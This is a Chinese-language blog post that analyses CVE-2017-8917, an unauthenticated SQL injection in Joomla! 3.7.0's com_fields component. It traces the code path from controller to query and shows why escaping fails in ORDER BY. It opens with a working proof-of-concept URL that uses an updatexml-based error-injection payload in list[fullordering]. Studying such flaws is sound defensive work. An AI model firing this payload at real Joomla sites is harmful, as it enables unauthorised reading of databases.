---
title: '[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析'
date: 2017-05-19 09:39:18
tags: [代码审计,SQL注入,漏洞分析]
categories: Web Security
---
Joomla!3.7.0 Core SQL注入漏洞.
<!-- more -->
# POC
这次干脆先放出poc吧。
```
http://localhost:2500/Joomla370/index.php?
option=com_fields
&view=fields
&layout=modal
&list[fullordering]=updatexml(1,concat(0x3e,database()),0)
```
这次根据参数的传入流程来进行分析。

# 漏洞
## 危害组件
3.7.0版本中出现了`com_field`组件,无需授权即可访问。查看`...\components\com_fields\controller.php`，在第27行左右，其相关代码如下：
```php
public function __construct($config = array())
	{
		$this->input = JFactory::getApplication()->input;

		// Frontpage Editor Fields Button proxying:
		if ($this->input->get('view') === 'fields' && $this->input->get('layout') === 'modal')
		{
			// Load the backend language file.
			$lang = JFactory::getLanguage();
			$lang->load('com_fields', JPATH_ADMINISTRATOR);

			$config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR;
		}

		parent::__construct($config);
	}
```
可以看到它先判断通过`view`是否等于`fields`,`layout`是否等于`modal`,而这两个参数都是我们可控的。若满足则将会加载`JPATH_ADMINISTRATOR`中的`com_fields`组件，并且将`base_path`设置为 `JPATH_COMPONENT_ADMINISTRATOR`，之后调用父类的构造方法。

## 传入sql语句
在调用父类构造方法后，一路运行到`...\Joomla370\libraries\legacy\controller\legacy.php`中，约莫707行，这时会通过`$this->$doTask`调用`display()`函数。

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg)

跟进`display()`函数，它位于 `...\Joomla370\libraries\legacy\controller\legacy.php`，接着运行至legacy.php的约莫671行左右，调用了视图（view）的`display()`函数。我们跟进一下，跳转进入`...\Joomla370\administrator\components\com_fields\views\fields\view.html.php`，

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/viewdisplay2.jpg?raw=true)

此时运行到，下面这条语句，给`get()`传入的参数为`State`

```php
$this->state         = $this->get('State');
```

我们跟进这个`get()`函数，一直运行到422行，

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getState.jpg?raw=true)

之后将会调用 `getState()`，跟进，进入`...\Joomla370\libraries\legacy\model\legacy.php`

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callpopulateState.jpg)

之后会调用filedsModel类中的`populateState()`，跟进后会发现调用其父类的`populateState()`函数，其定义在 `...\Joomla370\libraries\legacy\model\list.php`中，约莫在第495行，相关代码如下：
```php
..省略..

if ($list = $app->getUserStateFromRequest($this->context . '.list', 'list', array(), 'array'))

..省略..
```
这里我们先跟进一下`getUserStateFromRequest()`，它的定义在`...\Joomla370\libraries\cms\application\cms.php`中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了`fullordering`的值。

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/fullordering.jpg)

在该函数运行完后，流程将会回到前面的那个定义在`...\Joomla370\libraries\cms\application\cms.php`中的`populateState()`函数。此时运行的代码如下：
```php
	foreach ($list as $name => $value)
	{
		// Exclude if blacklisted
		if (!in_array($name, $this->listBlacklist))
		{
			// Extra validations
			switch ($name){...}
			$this->setState('list.' . $name, $value);
		}
	}
```
如果数组的key不在黑名单（blacklisted）中，将会为`$list`变量根据相应的`State`进行注册，在这部分函数运行到结束部分，可以看见成功的控制了`list`数组的`fullordering`的值。

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/thissetstate.jpg?raw=true)

查看变量，如下：

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/arraylist.jpg?raw=true)

## 注入过程
接下来继续运行，一直运行回到`Joomla370\administrator\components\com_fields\views\fields\view.html.php`中的`display()`函数中。

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getitem.jpg?raw=true)

跟进这一行 `$this->get('Items');`，进入`...\Joomla370\libraries\legacy\view\legacy.php`，约莫在422行,这里的行为跟前面分析类似，此后将会调用`getitem()`：

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callgetitem.jpg?raw=true)

继续跟进，进入`...\Joomla370\libraries\legacy\model\list.php`，约莫在186行：
```php
try
	{
		// Load the list items and add the items to the internal cache.
		$this->cache[$store] = $this->_getList($this->_getListQuery(), $this->getStart(), $this->getState('list.limit'));
	}
```
通过`_getList`调用了`_getListQuery`,继续跟进，进入`...\Joomla370\libraries\legacy\model\list.php`，约莫在 132行，
```
if ($lastStoreId != $currentStoreId || empty($this->query))
{
	$lastStoreId = $currentStoreId;
	$this->query = $this->getListQuery();
}
```
调用了 `getListQuery()`，继续跟进，进入 `...\Joomla370\administrator\components\com_fields\models\fields.php`,一直运行到约莫在 305 行，调用`getState`方法，传入`list.fullordering`参数。相关代码如下：

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listordering2.jpg?raw=true)

查看变量表：

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listfullordering3.jpg?raw=true)

之后在第314行，将`$listOrdering`带入查询，相关代码如下：
```php
$query->order($db->escape($listOrdering) . ' ' . $db->escape($orderDirn));
```

在进行`$query->order`之前，会先进行一次过滤，跟进`$db->escape`，进入`...\Joomla370\libraries\joomla\database\driver\mysqli.php`，约莫242行，相关代码如下：
```php
public function escape($text, $extra = false)
	{
		$this->connect();

		$result = mysqli_real_escape_string($this->getConnection(), $text);

		if ($extra)
		{
			$result = addcslashes($result, '%_');
		}

		return $result;
	}
```
对于传入的`$text`通过`mysqli_real_escape_string()`进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。

# 成功注入

![](https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/poc.jpg?raw=true)
